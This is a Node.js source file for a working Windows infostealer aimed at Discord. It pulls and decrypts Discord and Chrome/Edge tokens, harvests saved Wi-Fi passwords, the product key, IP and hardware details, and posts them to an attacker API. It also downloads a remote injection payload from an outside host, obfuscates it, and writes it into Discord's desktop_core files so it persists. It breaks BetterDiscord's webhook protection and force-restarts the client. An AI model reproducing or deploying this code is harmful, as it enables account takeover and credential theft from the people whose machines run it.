const fs = require("fs"), { readFileSync, readdirSync, existsSync } = require("fs"),
    { execSync, exec } = require('child_process');
let jsobf = require('javascript-obfuscator'),
    buffreplace = require('buffer-replace'),
    path = require("path"),
    crypto = require("crypto"),
    aura = require("win-dpapi"),
    axios = require('axios'),
    fetch = require("node-fetch");
let tokens = new Array(),
    injectPath = new Array(),

    API = "http://localhost:3000/request" // here you need to add your api so that the recommendation data can be sent to host in replit lol
    
switch (process.platform) {
    case "win32":
        let appdata = process.env.appdata,
            localappdata = process.env.localappdata,
            killdcop = true,
            paths = [`${appdata}/discord/`,`${appdata}/discordcanary/`,`${appdata}/discordptb/`,`${appdata}/discorddevelopment/`,`${appdata}/lightcord/`,`${appdata}/Opera Software/Opera Stable/`,`${appdata}/Opera Software/Opera GX Stable/`,`${localappdata}/Google/Chrome/User Data/Default/`,`${localappdata}/Google/Chrome/User Data/Profile 1/`,`${localappdata}/Google/Chrome/User Data/Profile 2/`,`${localappdata}/Google/Chrome/User Data/Profile 3/`,`${localappdata}/Google/Chrome/User Data/Profile 4/`,`${localappdata}/Google/Chrome/User Data/Profile 5/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/`,`${localappdata}/Google/Chrome/User Data/Default/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,`${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,`${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,`${localappdata}/Microsoft/Edge/User Data/Default/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,`${localappdata}/Microsoft/Edge/User Data/Default/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,`${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,`${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`],
            cords = ['discord','discordcanary','discordptb','discorddevelopment','lightcord'];
        
        discordinjected()
        tokenfuck()

        const getSystemInfo = () => {
            function ww() {
                try {
                  let w = execSync(`netsh wlan export profile key=clear;Get-ChildItem *.xml | ForEach-Object {$xml = [xml](get-content $_);$a = $xml.WLANProfile.SSIDConfig.SSID.name + ": " + $xml.WLANProfile.MSM.Security.sharedKey.keymaterial;$a;}`, { shell: "powershell.exe" }).toString().split("\r\n");
                  return w.filter(l => l.includes(": ")).map(l => l.replace(/�\?T/g, "'")).join("\n");
                } catch (er) {
                  console.error(er);
                  return "";
                }
            }
            try {
                return {
                    UUID: execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0],
                    MacAddress: execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0],
                    ProductKey: execSync("powershell.exe (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey").toString().split("\r\n")[0],
                    LocalIp: execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0],
                    Ram: execSync("wmic os get TotalVisibleMemorySize").toString().split("\r\n")[1].trim() + " KB",
                    CpuModel: execSync("wmic cpu get caption").toString().split("\r\r\n")[1].trim(),
                    UserName: execSync("echo %USERNAME%").toString().trim(),
                    GetIpAddress: execSync("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress").toString().split("\r\n")[0],
                    WifiPass: ww(),
                };
            } catch (e) {
                console.error(e);
                return {};
            }
        };

        async function tokenfuck() {
            for (p of paths) {
                await find(p);
            };
            await check(tokens)
        }

        async function find(p) {
            let tail = p;p += 'Local Storage/leveldb';
            if (!cords.some(d => tail.includes(d)))  {
                try {
                    readdirSync(p).map(f => {
                        (f.endsWith('.log') || f.endsWith('.ldb')) && readFileSync(`${p}/${f}`, 'utf8').split(/\r?\n/).forEach(l => {
                            const patterns = [
                                new RegExp(/mfa\.[\w-]{84}/g), 
                                new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
                            ];
                            for (const p of patterns) {
                                const foundTkns = l.match(p);
                                if (foundTkns) {
                                    foundTkns.forEach(tkn => {
                                        if (!tokens.includes(tkn)) return tokens.push(tkn)
                                    });
                                }
                            }
                        });
                    });
                } catch (e) {}
                return;
            } else {
                if (existsSync(`${tail}/Local State`)) {
                    try {
                        readdirSync(p).map(f => {
                            (f.endsWith('.log') || f.endsWith('.ldb')) && readFileSync(`${p}/${f}`, 'utf8').split(/\r?\n/).forEach(l => {
                                const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
                                const foundTkns = l.match(pattern);
                                if (foundTkns) {
                                    foundTkns.forEach(tkn => {
                                        let enc = Buffer.from(JSON.parse(readFileSync(`${tail}/Local State`)).os_crypt.encrypted_key, 'base64').slice(5);
                                        let key = aura.unprotectData(Buffer.from(enc, 'utf-8'), null, 'CurrentUser');
                                        const tkns = Buffer.from(tkn.split('dQw4w9WgXcQ:')[1], 'base64');
                                        let run = tkns.slice(3, 15), mid = tkns.slice(15, tkns.length - 16); 
                                        let decyph = crypto.createDecipheriv('aes-256-gcm', key, run); decyph.setAuthTag(tkns.slice(tkns.length - 16, tkns.length));
                                        let out = decyph.update(mid, 'base64', 'utf-8') + decyph.final('utf-8');
                                        if (!tokens.includes(out)) return tokens.push(out)
                                    })
                                };
                            });
                        });
                    } catch (e) {}
                    return;
                }
            }
        }

        async function check(t) {
            for (let a of t) {
                await axios.get(`https://discord.com/api/v9/users/@me`, 
                    {headers: {"Content-Type": "application/json","authorization": `${a}`}}
                ).then(r => 
                    {e = r.data}
                ).catch(() => {
                    e = null
                }) 
                if (!e) continue;
                if (a) await sendall(a)
            }
        }

        async function inject() {
            let resp = await axios.get("https://6889.fun/aurathemes/api/inject", {headers: {aurathemes: true}});
            let obf = jsobf.obfuscate(resp.data.replace("*API*", API), {"ignoreRequireImports": true, "compact": true, "controlFlowFlattening": true, "controlFlowFlatteningThreshold": 0.5, "deadCodeInjection": false, "deadCodeInjectionThreshold": 0.01, "debugProtection": false, "debugProtectionInterval": 0, "disableConsoleOutput": true, "identifierNamesGenerator": "hexadecimal", "log": false, "numbersToExpressions": false, "renameGlobals": false, "selfDefending": false, "simplify": true, "splitStrings": false, "splitStringsChunkLength": 5, "stringArray": true, "stringArrayEncoding": ["base64"], "stringArrayIndexShift": true, "stringArrayRotate": false, "stringArrayShuffle": false, "stringArrayWrappersCount": 5, "stringArrayWrappersChainedCalls": true, "stringArrayWrappersParametersMaxCount": 5, "stringArrayWrappersType": "function", "stringArrayThreshold": 1, "transformObjectKeys": false, "unicodeEscapeSequence": false });
            let payload = obf.getObfuscatedCode();
            injectPath.forEach(file => {
                try {
                    fs.writeFileSync(file, payload, {encoding: 'utf8',flag: 'w'});
                } catch (e) {
                    console.error(e)
                };
            });
        };

        function findindex(firstpath) {
            let dcpaths = fs.readdirSync(firstpath);
            dcpaths.forEach((file) => {
                let filePath = path.join(firstpath, file);
                let fileStat = fs.statSync(filePath);
                if (fileStat.isDirectory()) {findindex(filePath)} else {if (file === "index.js" && !firstpath.includes("node_modules") && firstpath.includes("desktop_core")) {injectPath.push(filePath)}}
            });
        }

        async function findinject(firstpath) {
        const files = await fs.promises.readdir(firstpath);
            for (const file of files) {
                const filePath = path.join(firstpath, file);
                const fileStat = await fs.promises.stat(filePath);
                if (fileStat.isDirectory()) {
                    if (file === 'aura') {await fs.rmdirSync(filePath)} else {await findinject(filePath)}
                }
            }
        }

        function betterbroke() {
            let dir = `${localappdata}/BetterDiscord/data/betterdiscord.asar`;
            if (fs.existsSync(dir)) {
                x = fs.readFileSync(dir);
                fs.writeFileSync(dir, buffreplace(x, "api/webhooks", "aurathemesontop"))
            }
            return;
        }

        async function discordinjected() {
            const discords = fs.readdirSync(localappdata).filter(file => file.includes("iscord")).map(file => path.join(localappdata, file));
            for (const paths of discords) {findindex(paths)}
            for (const paths of discords) {await findinject(paths)}
            await inject();
            await betterbroke();
            if (killdcop) {await killalldc()}
        }

        async function killalldc() {
            const util = require('util');
            const exec = util.promisify(require('child_process').exec);
            const clients = ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe'];
            try {
                const { stdout } = await exec('tasklist');
                for (const client of clients) {
                    if (stdout.includes(client)) {
                        await killAndRestartClient(client);
                    }
                }
            } catch (err) {
              console.error(err);
            }
          }

          async function killAndRestartClient(c) {
            try {
                await exec(`taskkill /F /T /IM ${c}`);
                const clientPath = `${localappdata}/${c.replace('.exe', '')}/Update.exe`;
                await exec(`"${clientPath}" --processStart ${c}`);
            } catch (err) {
              console.error(err);
            }
          }

        async function sendall(t) {
            fetch(`${API}/startup`, {
                method: "POST", 
                body: JSON.stringify({
                    token: t,
                    ...getSystemInfo()
                })
            })
        }
        
        break
    default: break
}